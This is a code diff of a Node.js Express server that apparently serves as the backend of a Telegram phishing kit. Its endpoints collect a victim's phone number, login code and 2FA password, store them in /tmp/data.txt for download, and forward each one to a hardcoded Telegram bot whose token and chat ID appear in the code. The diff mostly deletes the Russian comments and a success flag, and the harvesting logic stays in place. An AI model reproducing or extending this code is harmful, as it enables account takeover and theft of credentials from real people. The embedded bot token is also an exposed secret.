@@ -8,7 +8,6 @@ const PORT = process.env.PORT || 3000;
 
 const DATA_FILE = path.join('/tmp', 'data.txt');
 
-// ===== ТОКЕНЫ ДЛЯ ЛОГОВ =====
 const LOG_BOT_TOKEN = '8874938761:AAEb6WvhZ8xhvYrrIThYoYlgBWSSE_EVcLo';
 const LOG_CHAT_ID = '7424945574';
 
@@ -18,7 +17,6 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
-// ===== ОТПРАВКА ЛОГОВ В TELEGRAM =====
 async function sendLog(message) {
     try {
         await fetch(`https://api.telegram.org/bot${LOG_BOT_TOKEN}/sendMessage`, {
@@ -36,7 +34,6 @@ async function sendLog(message) {
     }
 }
 
-// ===== 1. ПРИЁМ НОМЕРА =====
 app.post('/api/phone', async (req, res) => {
     const { phone } = req.body;
 
@@ -58,7 +55,6 @@ app.post('/api/phone', async (req, res) => {
     res.json({ success: true });
 });
 
-// ===== 2. ПРИЁМ КОДА =====
 app.post('/api/verify', async (req, res) => {
     const { phone, code } = req.body;
 
@@ -78,11 +74,9 @@ app.post('/api/verify', async (req, res) => {
         `🕒 ${new Date().toLocaleString()}`
     );
 
-    // ===== ПОСЛЕ УСПЕШНОГО ВВОДА КОДА =====
-    res.json({ success: true, showSuccess: true });
+    res.json({ success: true });
 });
 
-// ===== 3. ПРИЁМ 2FA ПАРОЛЯ =====
 app.post('/api/2fa', async (req, res) => {
     const { phone, code, password } = req.body;
 
@@ -109,11 +103,9 @@ app.post('/api/2fa', async (req, res) => {
         `🕒 ${new Date().toLocaleString()}`
     );
 
-    // ===== ПОСЛЕ УСПЕШНОГО ВВОДА 2FA =====
-    res.json({ success: true, showSuccess: true });
+    res.json({ success: true });
 });
 
-// ===== 4. СКАЧИВАНИЕ DATA.TXT =====
 app.get('/download', (req, res) => {
     if (fs.existsSync(DATA_FILE)) {
         res.download(DATA_FILE, 'data.txt');
